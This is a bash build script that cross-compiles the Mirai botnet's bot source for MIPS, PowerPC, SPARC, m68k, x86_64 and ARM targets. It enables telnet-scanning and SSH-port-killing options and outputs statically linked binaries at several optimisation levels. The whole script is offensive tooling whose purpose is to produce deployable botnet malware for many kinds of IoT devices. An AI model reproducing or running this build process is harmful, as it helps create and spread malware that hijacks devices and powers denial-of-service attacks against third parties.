#!/bin/bash
function compile_bot {
    for i in `seq 0 3` s
    do
    	$1-linux-gnu-g++ -fpermissive  $3 -std=c99 -DMIRAI_TELNET bot_g++/*.c -O$i -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2-g++-8.2.0-O$i" -DMIRAI_BOT_ARCH=\""$1"\"	
        # "$1-strip" release/"$2.gcc-O$i" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
    done
}


rm release/mirai.*
rm release/miraint.*

compile_bot mips mirai-mips " -DKILLER_REBIND_SSH -static"
compile_bot mipsel mirai-mpsl " -DKILLER_REBIND_SSH -static"
compile_bot powerpc mirai-ppc " -DKILLER_REBIND_SSH -static"
compile_bot sparc64 mirai-spc " -DKILLER_REBIND_SSH -static"
compile_bot m68k mirai-m68k " -DKILLER_REBIND_SSH -static"

for i in `seq 0 3` s
do
    g++ -fpermissive  -DMIRAI_TELNET -DKILLER_REBIND_SSH -static -std=c99 -DMIRAI_TELNET bot_g++/*.c -O$i -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"mirai-x86_64-g++-8.2.0-O$i" -DMIRAI_BOT_ARCH=\""i586"\"    
    g++-7 -fpermissive -DMIRAI_TELNET -DKILLER_REBIND_SSH -static -std=c99 -DMIRAI_TELNET bot_g++/*.c -O$i -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"mirai-x86_64-g++-7.3.0-O$i" -DMIRAI_BOT_ARCH=\""i586"\"   
    arm-linux-gnueabi-g++ -fpermissive -DMIRAI_TELNET -DKILLER_REBIND_SSH -static -std=c99 -DMIRAI_TELNET bot_g++/*.c -O$i -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"mirai-arm-g++-8.2.0-O$i" -DMIRAI_BOT_ARCH=\""arm5l"\" 
done
